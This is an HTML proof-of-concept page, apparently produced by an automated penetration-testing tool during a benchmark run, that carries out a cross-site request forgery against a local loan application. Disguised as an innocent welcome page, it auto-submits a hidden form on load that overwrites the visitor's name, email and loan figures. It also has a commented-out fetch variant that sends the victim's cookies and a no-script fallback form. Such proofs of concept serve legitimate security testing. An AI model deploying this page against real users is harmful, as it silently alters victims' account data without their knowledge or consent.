<!-- 
POC: HTML-based CSRF attack demonstrating how an authenticated user visiting a malicious page would have their profile modified without their knowledge.
Target: ./repo
Created: 2025-11-07T19:09:21.712Z
Session: benchmark-XBEN-063-24-mhp81tzn

To test this POC:
1. Open this file in a web browser: file:///home/daytona/.pensar/executions/benchmark-XBEN-063-24-mhp81tzn/pocs/poc_csrf_profile_update_attack.html
2. Or serve it and navigate to the target application
3. Observe the vulnerability demonstration (e.g., XSS alert, CSRF execution)
-->

<!DOCTYPE html>
<html>
<head>
    <title>Innocent Looking Page</title>
</head>
<body>
    <h1>Welcome to our website</h1>
    <p>Loading content...</p>
    
    <!-- Hidden CSRF attack form -->
    <!-- This form will be automatically submitted when the page loads -->
    <!-- If a user who is authenticated to localhost visits this page, -->
    <!-- their profile will be modified without their knowledge -->
    
    <form id="csrf_form" action="http://localhost/profile" method="POST" style="display:none;">
        <input type="hidden" name="name" value="Hacked">
        <input type="hidden" name="lastname" value="User">
        <input type="hidden" name="email" value="hacked@evil.com">
        <input type="hidden" name="loan_amount" value="99999.0">
        <input type="hidden" name="loan_term_months" value="1">
        <input type="hidden" name="monthly_payment" value="99999">
    </form>
    
    <script>
        // Automatically submit the hidden form when page loads
        // This demonstrates the CSRF vulnerability - no user interaction needed
        document.addEventListener('DOMContentLoaded', function() {
            console.log('[CSRF Attack] Submitting profile modification form...');
            document.getElementById('csrf_form').submit();
        });
    </script>
    
    <!-- Alternative: using fetch API for CSRF attack -->
    <script>
        // Fetch-based CSRF attack (works even if form submission is blocked)
        window.addEventListener('load', function() {
            // Uncomment below to use fetch instead of form submission
            /*
            fetch('http://localhost/profile', {
                method: 'POST',
                credentials: 'include',  // Include cookies for authentication
                headers: {
                    'Content-Type': 'application/x-www-form-urlencoded',
                },
                body: new URLSearchParams({
                    'name': 'Hacked',
                    'lastname': 'User',
                    'email': 'hacked@evil.com',
                    'loan_amount': '99999.0',
                    'loan_term_months': '1',
                    'monthly_payment': '99999'
                })
            }).then(response => {
                console.log('[CSRF Attack] Profile update response:', response.status);
            }).catch(error => {
                console.log('[CSRF Attack] Error:', error);
            });
            */
        });
    </script>
    
    <!-- Description of the vulnerability -->
    <noscript>
        <p>This page demonstrates a CSRF attack. If JavaScript is disabled, 
        you can manually submit the form below to see the vulnerability:</p>
        
        <form action="http://localhost/profile" method="POST">
            <input type="hidden" name="name" value="Hacked">
            <input type="hidden" name="lastname" value="User">
            <input type="hidden" name="email" value="hacked@evil.com">
            <input type="hidden" name="loan_amount" value="99999.0">
            <input type="hidden" name="loan_term_months" value="1">
            <input type="hidden" name="monthly_payment" value="99999">
            <input type="submit" value="Click here to see CSRF in action">
        </form>
    </noscript>
</body>
</html>